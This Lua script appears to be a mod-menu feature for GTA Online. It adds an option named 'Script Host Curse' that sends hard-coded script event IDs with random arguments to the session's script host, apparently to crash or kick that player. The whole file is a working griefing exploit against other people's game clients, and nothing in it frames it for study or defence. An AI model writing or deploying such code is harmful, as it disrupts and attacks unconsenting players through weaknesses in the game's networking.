local function random_args(id, amount)
    local args = {id}
    if not amount or amount == 0 then
        return args
    else
        for i = 2, amount + 1 do
            args[i] = math.random(-2147483647, 2147483647)
        end
        return args
    end
end

local fuck = menu.add_feature('Script Host Curse', 'action_value_str', 0, function(feat)
    local events = {-1539131577, -2093023277, -786546101}
    local id = script.get_host_of_this_script()
    if player.is_player_valid(id) then
        for i = 1, 5 do
            script.trigger_script_event(events[feat.value + 1], id, random_args(player.player_id(), 15))
        end
    end
end)
fuck:set_str_data({'v1', 'v2', 'v3'})